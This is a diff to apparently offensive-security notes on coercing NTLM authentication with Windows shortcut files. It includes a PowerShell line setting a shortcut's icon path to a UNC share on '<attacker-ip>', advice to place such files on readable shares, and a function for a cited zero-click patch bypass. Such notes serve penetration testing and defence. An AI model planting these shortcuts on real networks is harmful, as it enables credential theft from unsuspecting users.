@@ -102,3 +102,27 @@ $shortcut.IconLocation = "\\<attacker-ip>\test.ico"
 $shortcut.Save()
 ```
 A good location would be public readable shares.
+
+## Zero Click
+
+Since UNC Paths on windows shortcuts has been patched on early updates, there are another vulnerability.
+
+* [https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
+
+
+```
+function create-lnk { param($targetPath)
+
+$shortcutPath = "lab.lnk"
+$iconLocation = "C:\Windows\System32\SHELL32.dll"
+
+$wShell = New-Object -ComObject WScript.Shell
+$shortcut = $wShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $targetPath
+$shortcut.IconLocation = $iconLocation
+
+$shortcut.Save()
+
+Write-Output "Shortcut created at: $shortcutPath"
+}
+```
